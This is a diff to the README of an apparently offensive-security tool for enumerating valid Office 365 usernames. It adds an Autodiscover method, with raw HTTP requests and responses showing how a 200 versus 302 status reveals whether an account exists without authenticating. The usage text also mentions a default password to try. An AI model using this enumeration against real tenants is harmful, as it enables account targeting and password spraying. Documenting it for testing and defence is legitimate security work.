@@ -1,6 +1,6 @@
 # Office 365 User Enumeration
 
-Enumerate valid usernames from Office 365 using ActiveSync or office.com login page.
+Enumerate valid usernames from Office 365 using ActiveSync, Autodiscover, or office.com login page.
 
 ## Usage
 
@@ -9,7 +9,7 @@ o365enum will read usernames from the file provided as first parameter. The file
 ```
 python3.6 o365enum.py -h
 usage: o365enum.py [-h] -u USERLIST [-p PASSWORD] [-n NUM] [-v]
-                   [-m {activesync,office.com}]
+                   [-m {activesync,autodiscover,office.com}]
 
 Office365 User Enumeration Script
 
@@ -21,7 +21,7 @@ optional arguments:
                         password to try (default: Password1)
   -n NUM, --num NUM     # of reattempts to remove false negatives (default: 3)
   -v, --verbose         Enable verbose output at urllib level (default: False)
-  -m {activesync,office.com}, --method {activesync,office.com}
+  -m {activesync,autodiscover,office.com}, --method {activesync,autodiscover,office.com}
                         method to use (default: activesync)
 ```
 
@@ -123,6 +123,85 @@ Connection: close
 
 --snip--
 ```
+
+### Autodiscover Enumeration
+
+The autodiscover endpoint allows for user enumeration without an authentication attempt. The endpoint returns a 200 status code if the user exists and a 302 if the user does not exists (unless the redirection is made to an on-premise Exchange server).
+
+#### Existing User
+
+```
+GET /autodiscover/autodiscover.json/v1.0/existing@contoso.com?Protocol=Autodiscoverv1 HTTP/1.1
+Host: outlook.office365.com
+User-Agent: Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0.12026; Pro
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: close
+MS-ASProtocolVersion: 14.0
+```
+
+```
+HTTP/1.1 200 OK
+Cache-Control: private
+Content-Length: 97
+Content-Type: application/json; charset=utf-8
+Vary: Accept-Encoding
+Server: Microsoft-IIS/10.0
+request-id: fee7f899-7115-43da-9d34-d3ee19920a89
+X-CalculatedBETarget: AM0PR09MB2882.eurprd09.prod.outlook.com
+X-BackEndHttpStatus: 200
+X-RUM-Validated: 1
+X-AspNet-Version: 4.0.30319
+X-DiagInfo: AM0PR09MB2882
+X-BEServer: AM0PR09MB2882
+X-Proxy-RoutingCorrectness: 1
+X-Proxy-BackendServerStatus: 200
+X-Powered-By: ASP.NET
+X-FEServer: AM0PR0202CA0008
+Date: Mon, 02 Mar 2020 12:50:48 GMT
+Connection: close
+
+{"Protocol":"Autodiscoverv1","Url":"https://outlook.office365.com/autodiscover/autodiscover.xml"}
+```
+
+#### Inexistent User
+
+```
+GET /autodiscover/autodiscover.json/v1.0/inexistent@contoso.com?Protocol=Autodiscoverv1 HTTP/1.1
+Host: outlook.office365.com
+User-Agent: Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0.12026; Pro
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: close
+MS-ASProtocolVersion: 14.0
+```
+
+```
+HTTP/1.1 302 Found
+Cache-Control: private
+Content-Length: 277
+Content-Type: text/html; charset=utf-8
+Location: https://outlook.office365.com/autodiscover/autodiscover.json?Email=inexistent%40contoso.com&Protocol=Autodiscoverv1&RedirectCount=1
+Server: Microsoft-IIS/10.0
+request-id: 1c50adeb-53ac-41b9-9c34-7045cffbae45
+X-CalculatedBETarget: DB6PR0202MB2568.eurprd02.prod.outlook.com
+X-BackEndHttpStatus: 302
+X-RUM-Validated: 1
+X-AspNet-Version: 4.0.30319
+X-DiagInfo: DB6PR0202MB2568
+X-BEServer: DB6PR0202MB2568
+X-Proxy-RoutingCorrectness: 1
+X-Proxy-BackendServerStatus: 302
+X-Powered-By: ASP.NET
+X-FEServer: AM0PR0202CA0013
+Date: Mon, 02 Mar 2020 12:50:50 GMT
+Connection: close
+
+<html><head><title>Object moved</title></head><body>
+<h2>Object moved to <a href="https://outlook.office365.com/autodiscover/autodiscover.json?Email=inexistent%40contoso.com&amp;Protocol=Autodiscoverv1&amp;RedirectCount=1">here</a>.</h2>
+</body></html>
+```
+
 
 ### Office.com Enumeration
 
